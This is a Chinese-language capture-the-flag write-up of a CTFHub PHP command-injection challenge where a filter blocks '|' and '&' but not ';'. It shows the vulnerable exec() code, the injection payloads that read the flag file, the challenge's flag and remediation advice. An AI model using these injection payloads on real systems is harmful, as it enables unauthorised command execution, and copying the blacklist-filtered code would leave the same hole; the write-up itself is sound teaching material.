CTFHub - Web - 命令注入-过滤运算符

# CTFHub # Web # RCE # 命令注入 # 运算符绕过

一、题目信息

  • 题目名称：命令注入-过滤运算符
  • 题目方向：Web - RCE
  • 运行环境：PHP + Linux
  • 题目目标：绕过服务端对部分运算符的过滤并读取动态 Flag 文件。

二、漏洞分析

页面源码显示，用户输入的 ip 被直接拼接到 ping 命令中。服务端使用正则表达式过滤了管道符 | 和逻辑与符 &：

<?php
$ip = $_GET['ip'];
$m = [];

if (!preg_match_all("/(\||\&)/", $ip, $m)) {
    $cmd = "ping -c 4 {$ip}";
    exec($cmd, $res);
} else {
    $res = $m;
}
?>

该过滤采用黑名单方式，但并未过滤命令分隔符 ;。因此可以先用 ; 结束原本的 ping 命令，再追加任意系统命令。

关键 payload：127.0.0.1;命令。过滤只针对 | 和 &，分号不会触发拦截。

三、解题步骤

  1. 验证命令注入： 
    127.0.0.1;id

    响应中除 ping 输出外，还回显了命令执行结果，确认当前权限为 www-data：

    uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
  2. 定位动态 Flag 文件： 
    127.0.0.1;find / -name "*flag*" -type f 2>/dev/null

    响应中返回目标文件路径：

    /var/www/html/flag_219262112929031.php
  3. 读取 Flag： 
    127.0.0.1;cat /var/www/html/flag_219262112929031.php

    命令输出被 exec() 收集并通过 print_r() 回显：

    <?php // ctfhub{c9645980a0e24cd76af008f1}

    Flag 文件名会随运行环境动态生成，实际复现时应使用上一步得到的新路径。

四、最终 Flag

ctfhub{c9645980a0e24cd76af008f1}

五、修复建议

  • 严格校验输入：使用 filter_var($ip, FILTER_VALIDATE_IP) 校验目标地址，只允许合法 IP。
  • 不要拼接 Shell 命令：避免将用户输入直接传入 exec()；确需调用命令时，应使用参数分离 API，并对参数调用 escapeshellarg()。
  • 不要依赖运算符黑名单：即使过滤了 | 和 &，;、换行和命令替换仍可能绕过，输入校验应采用严格白名单。
  • 最小化权限：降低 Web 服务账户权限，并将 Flag 等敏感文件移出 Web 根目录及可读范围。
